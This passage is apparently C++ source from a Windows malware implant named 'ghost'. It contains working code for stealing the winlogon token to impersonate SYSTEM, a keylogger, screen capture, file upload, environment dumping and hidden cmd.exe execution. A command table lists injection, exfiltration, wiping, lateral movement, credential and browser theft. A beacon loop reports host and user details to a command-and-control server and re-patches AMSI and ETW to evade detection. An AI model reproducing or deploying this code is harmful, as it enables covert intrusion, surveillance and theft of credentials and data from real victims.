    if (hf == INVALID_HANDLE_VALUE) return L"[error: cannot open " + wPath + L"]";
    LARGE_INTEGER fsz = {};
    GetFileSizeEx(hf, &fsz);
    if (fsz.QuadPart > 10 * 1024 * 1024) { CloseHandle(hf); return L"[error: file > 10 MB]"; }
    std::vector<BYTE> buf(static_cast<size_t>(fsz.QuadPart));
    DWORD rd = 0;
    ReadFile(hf, buf.data(), static_cast<DWORD>(buf.size()), &rd, nullptr);
    CloseHandle(hf);
    std::string b64 = Base64Encode(buf.data(), rd);
    // filename from path
    size_t sl = args.find_last_of("/\\");
    std::string fname = (sl == std::string::npos) ? args : args.substr(sl + 1);
    return L"[UPLOAD:" + UTF8ToWString(fname) + L"]\n" + UTF8ToWString(b64);
}

static std::wstring HandleStealToken(const std::string& /*args*/) {
    // Find winlogon.exe and duplicate its token
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return L"[error: snapshot]";
    PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
    DWORD winlogonPid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                winlogonPid = pe.th32ProcessID; break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    if (!winlogonPid) return L"[error: winlogon.exe not found]";

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
    if (!hProc) return L"[error: OpenProcess pid=" + std::to_wstring(winlogonPid)
                       + L" err=" + std::to_wstring(GetLastError()) + L"]";
    HANDLE hTok = nullptr;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hTok)) {
        CloseHandle(hProc);
        return L"[error: OpenProcessToken err=" + std::to_wstring(GetLastError()) + L"]";
    }
    CloseHandle(hProc);

    HANDLE hDup = nullptr;
    BOOL ok = DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nullptr,
                               SecurityImpersonation, TokenPrimary, &hDup);
    CloseHandle(hTok);
    if (!ok) return L"[error: DuplicateTokenEx err=" + std::to_wstring(GetLastError()) + L"]";

    if (g_StolenToken) CloseHandle(g_StolenToken);
    g_StolenToken = hDup;
    ImpersonateLoggedOnUser(g_StolenToken);
    return L"[+] Token stolen from winlogon.exe (pid=" + std::to_wstring(winlogonPid) + L"), impersonating SYSTEM";
}

static std::wstring HandleSleepCmd(const std::string& args) {
    if (args.empty()) return L"Usage: sleep <seconds>";
    int secs = atoi(args.c_str());
    if (secs < 1) return L"[error: seconds must be >= 1]";
    g_BeaconOverride = static_cast<DWORD>(secs);
    return L"[+] Beacon interval set to " + std::to_wstring(secs) + L"s";
}

static std::wstring HandleKeylogStart(const std::string& /*args*/) {
    if (KeylogRunning()) return L"[keylog: already running]";
    KeylogStart();
    return KeylogRunning() ? L"[+] Keylogger started" : L"[error: failed to install hook]";
}

static std::wstring HandleKeylogDump(const std::string& /*args*/) {
    if (!KeylogRunning()) return L"[keylog: not running — use keylog_start first]";
    return KeylogDump();
}

// =====================================================================
//  SCREENSHOT — GDI full-screen capture → BMP → base64
// =====================================================================
static std::wstring HandleScreenshot(const std::string& /*args*/) {
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) return L"[error: GetDC failed]";

    int cx = GetSystemMetrics(SM_CXSCREEN);
    int cy = GetSystemMetrics(SM_CYSCREEN);

    HDC     hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmp   = CreateCompatibleBitmap(hdcScreen, cx, cy);
    if (!hdcMem || !hbmp) {
        if (hdcMem) DeleteDC(hdcMem);
        if (hbmp)   DeleteObject(hbmp);
        ReleaseDC(NULL, hdcScreen);
        return L"[error: CreateCompatibleBitmap failed]";
    }

    HBITMAP hOld = static_cast<HBITMAP>(SelectObject(hdcMem, hbmp));
    BitBlt(hdcMem, 0, 0, cx, cy, hdcScreen, 0, 0, SRCCOPY | CAPTUREBLT);
    SelectObject(hdcMem, hOld);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    BITMAPINFOHEADER bi = {};
    bi.biSize        = sizeof(BITMAPINFOHEADER);
    bi.biWidth       = cx;
    bi.biHeight      = -cy;   // top-down
    bi.biPlanes      = 1;
    bi.biBitCount    = 24;
    bi.biCompression = BI_RGB;
    DWORD rowBytes   = ((static_cast<DWORD>(cx) * 3 + 3) & ~3u);
    bi.biSizeImage   = rowBytes * static_cast<DWORD>(cy);

    std::vector<BYTE> pixels(bi.biSizeImage);
    HDC hdcTmp = GetDC(NULL);
    GetDIBits(hdcTmp, hbmp, 0, static_cast<UINT>(cy),
              pixels.data(), reinterpret_cast<BITMAPINFO*>(&bi), DIB_RGB_COLORS);
    ReleaseDC(NULL, hdcTmp);
    DeleteObject(hbmp);

    BITMAPFILEHEADER bfh = {};
    bfh.bfType    = 0x4D42; // 'BM'
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize    = bfh.bfOffBits + bi.biSizeImage;

    std::vector<BYTE> bmpFile(bfh.bfSize);
    memcpy(bmpFile.data(),                    &bfh, sizeof(bfh));
    memcpy(bmpFile.data() + sizeof(bfh),      &bi,  sizeof(bi));
    memcpy(bmpFile.data() + bfh.bfOffBits,    pixels.data(), pixels.size());

    std::string b64 = Base64Encode(bmpFile.data(), static_cast<DWORD>(bmpFile.size()));
    return L"[SCREENSHOT:BMP]\n" + UTF8ToWString(b64);
}

// =====================================================================
//  KILL PROCESS
// =====================================================================
static std::wstring HandleKillProcess(const std::string& args) {
    if (args.empty()) return L"Usage: !kill <pid>";
    DWORD pid = static_cast<DWORD>(atol(args.c_str()));
    if (!pid) return L"[error: invalid pid]";
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!h) return L"[error: OpenProcess pid=" + std::to_wstring(pid)
                   + L" err=" + std::to_wstring(GetLastError()) + L"]";
    BOOL ok = TerminateProcess(h, 1);
    DWORD err = GetLastError();
    CloseHandle(h);
    return ok ? L"[+] Killed pid=" + std::to_wstring(pid)
              : L"[error: TerminateProcess pid=" + std::to_wstring(pid)
                + L" err=" + std::to_wstring(err) + L"]";
}

// =====================================================================
//  ENV DUMP
// =====================================================================
static std::wstring HandleEnvDump(const std::string& /*args*/) {
    LPWCH env = GetEnvironmentStringsW();
    if (!env) return L"[error: GetEnvironmentStringsW]";
    std::wstring out;
    for (LPWCH p = env; *p; p += wcslen(p) + 1)
        out += std::wstring(p) + L"\n";
    FreeEnvironmentStringsW(env);
    return out.empty() ? L"[env: empty]" : out;
}

// =====================================================================
//  GETPID
// =====================================================================
static std::wstring HandleGetPid(const std::string& /*args*/) {
    return L"PID: " + std::to_wstring(GetCurrentProcessId());
}

// =====================================================================
//  COMMAND TABLE
// =====================================================================
struct CmdEntry {
    const char* prefix;
    bool        exactMatch;
    std::wstring (*handler)(const std::string& args);
};

static const CmdEntry kCmdTable[] = {
    { "!ps ",          false, HandlePs },
    { "!lol ",         false, HandleLol },
    { "!inject-apc ",  false, HandleInjectApc },
    { "!inject ",      false, HandleInject },
    { "!migrate ",     false, HandleMigrate },
    { "!exfil ",       false, HandleExfil },
    { "!wipe",         false, HandleWipe },
    { "!lateral ",     false, HandleLateral },
    { "!creds",        true,  HandleCreds },
    { "ps",            true,  HandlePs },
    { "download ",     false, HandleDownload },
    { "upload ",       false, HandleUpload },
    { "steal_token",   true,  HandleStealToken },
    { "keylog_start",  true,  HandleKeylogStart },
    { "keylog_dump",   true,  HandleKeylogDump },
    { "sleep ",        false, HandleSleepCmd },
    { "!clipboard",    true,  HandleClipboard },
    { "!clipboard ",   false, HandleClipboard },
    { "!reverse ",     false, HandleReverse },
    { "!browser",      false, HandleBrowser },
    { "!screenshot",   true,  HandleScreenshot },
    { "!kill ",        false, HandleKillProcess },
    { "!env",          true,  HandleEnvDump },
    { "!getpid",       true,  HandleGetPid },
    { "exit",          true,  nullptr },
    { "sleep",         true,  nullptr }
};

// =====================================================================
//  EXECUTE COMMAND (fallback)
// =====================================================================
std::wstring ExecuteCommand(const std::wstring& cmd) {
    std::string cmdStr = WStringToUTF8(cmd);
    for (const auto& entry : kCmdTable) {
        if (entry.exactMatch) {
            if (cmdStr == entry.prefix && entry.handler)
                return entry.handler("");
        } else {
            if (cmdStr.rfind(entry.prefix, 0) == 0 && entry.handler)
                return entry.handler(cmdStr.substr(strlen(entry.prefix)));
        }
    }
    // Fallback: raw command via cmd.exe /C
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring cmdLine = std::wstring(sysRoot) + L"\\System32\\cmd.exe /C " + cmd;

    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return L"[error: pipe failed]";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi = {};
    if (!CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite);
        return L"[error: CreateProcess failed]";
    }
    CloseHandle(hWrite);

    std::string output;
    output.reserve(4096);
    char buf[4096]; DWORD rd = 0;
    while (output.size() < config::CMD_OUTPUT_MAX) {
        if (!ReadFile(hRead, buf, sizeof(buf), &rd, nullptr) || rd == 0) break;
        output.append(buf, rd);
    }
    if (WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS) == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
    }
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hRead);
    return UTF8ToWString(output);
}

// =====================================================================
//  PING C2 — hit /health before starting the beacon loop.
//  Retries indefinitely with exponential backoff (max 5 min).
//  Returns TRUE on first 200 response.
// =====================================================================
BOOL PingC2() {
    DWORD attempt = 0;
    while (true) {
        HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                           L"GET", L"/health", "", L"");
        if (resp.status == 200) {
            DebugLog(L"PingC2: server reachable");
            return TRUE;
        }
        ++attempt;
        DWORD shift = attempt < 7u ? attempt - 1u : 6u;
        DWORD backoffSec = 5u * (1u << shift);
        if (backoffSec > 300u) backoffSec = 300u;
        DebugLog(L"PingC2: not reachable (attempt " + std::to_wstring(attempt)
                 + L"), retrying in " + std::to_wstring(backoffSec) + L"s");
        Sleep(backoffSec * 1000);
    }
}

// =====================================================================
//  MAIN BEACON LOOP
// =====================================================================
DWORD BeaconLoop(const Session& session) {
    DebugLog(L"BeaconLoop started");

    g_SessionId  = session.sessionId;
    g_SessionKey = DeriveKeyFromSessionId(session.sessionId);
    DebugLog(L"Session: " + session.sessionId);

    DWORD failures    = 0;
    DWORD beaconCount = 0;
    bool  sentHello   = false;
    bool  firstPass   = true;
    bool  wasDown     = false; // track reconnect for re-evasion

    while (true) {
        try {
            // Re-apply evasion on every loop after first pass,
            // and force it again after a reconnect (wasDown)
            if (!firstPass) {
                ReapplyEvasion();
            }
            firstPass = false;

            ++beaconCount;
            DebugLog(L"Beacon #" + std::to_wstring(beaconCount) +
                     L" failures=" + std::to_wstring(failures));

            std::wstring task;
            BOOL ok = SendBeacon(session, task);

            if (!ok) {
                ++failures;
                wasDown = true;
                DebugLog(L"Beacon fail #" + std::to_wstring(failures));

                // Exponential backoff capped at 30 min
                DWORD backoffSec = config::BEACON_MIN * (1u << std::min<DWORD>(failures - 1u, 6u));
                if (backoffSec > 1800) backoffSec = 1800;
                DebugLog(L"Backoff " + std::to_wstring(backoffSec) + L"s");
                JitterSleep(backoffSec, backoffSec + 30);
                continue;
            }

            // Reconnected after being down — refresh evasion immediately
            if (wasDown) {
                DebugLog(L"Reconnected — refreshing evasion");
                PatchAMSI(); PatchETW(); ClearHardwareBreakpoints();
                wasDown = false;
            }
            failures = 0;

            // First successful beacon: send hello
            if (!sentHello) {
                sentHello = true;
                SendResult(session.sessionId,
                    L"[ghost] implant online\r\nhost: " + session.hostname +
                    L"\r\nuser: " + session.username +
                    L"\r\nelevated: " + (session.elevated ? L"yes" : L"no"));
                DebugLog(L"Hello sent");
            }

            // Migrate triggered — exit so mutex releases and child can take over
            if (g_MigrateExit) {
                SendResult(session.sessionId, L"[ghost] migration complete, exiting");
                return 0xDEAD;
            }

            // Execute task
            if (!task.empty() && task != L"sleep") {
                if (task == L"exit") {
                    DebugLog(L"Exit received");
                    SendResult(session.sessionId, L"[ghost] exiting on operator command");
                    return 0xDEAD;
                }
                DebugLog(L"Exec: " + task);
                std::wstring result = ExecuteCommand(task);
                if (result.size() > config::CMD_OUTPUT_MAX / sizeof(wchar_t))
                    result.resize(config::CMD_OUTPUT_MAX / sizeof(wchar_t));
                SendResult(session.sessionId, result);
                // Re-beacon immediately after a task — no sleep, pick up next command fast
                continue;
            }

            // Idle — release wake lock and sleep until next poll
            ReleaseWakeLock();
            if (g_BeaconOverride > 0)
                JitterSleep(g_BeaconOverride, g_BeaconOverride);
            else
                JitterSleep(config::BEACON_MIN, config::BEACON_MAX);

        } catch (const std::exception& e) {
            DebugLog(L"BeaconLoop exception: " + UTF8ToWString(e.what()));
            failures++;
            Sleep(15000);
        } catch (...) {
            DebugLog(L"BeaconLoop: unknown exception");
            failures++;
            Sleep(15000);
        }
    }
    return 1; // unreachable, but satisfies compiler
}